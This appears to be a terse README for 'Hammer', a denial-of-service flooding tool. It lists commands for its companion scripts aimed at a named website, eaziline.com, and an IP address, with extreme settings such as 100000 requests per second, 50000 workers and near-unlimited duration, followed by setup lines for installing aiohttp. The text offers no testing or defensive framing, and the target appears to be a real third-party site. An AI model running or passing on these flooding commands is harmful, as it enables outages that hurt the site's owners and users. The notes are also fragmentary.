1. How to use Hammer [`Watch it`](http://www.youtube.com/watch?v=HVbRUhX2EPo) 
2. Fork it...

chmod +x hammer.py
python3 hammer.py

ping eaziline.com

python3 hammer.py -s 198.18.16.66

python3 controlled-hammer.py https://eaziline.com/ \
    --rps 100000 \
    --workers 50000 \
    --duration 6000000000 \
    --max-requests 6000000000000000000000000000000000000

    python3 warm-cache.py http://eaziline.com/

    python3 warm-cache.py 198.18.16.66

    python site.py
    python site-max.py

 pip install aiohttp
 pip install aiohttp --break-system-packages
 python3 -m venv venv
source venv/bin/activate      # on Windows: venv\Scripts\activate
pip install aiohttp
python site-max.py   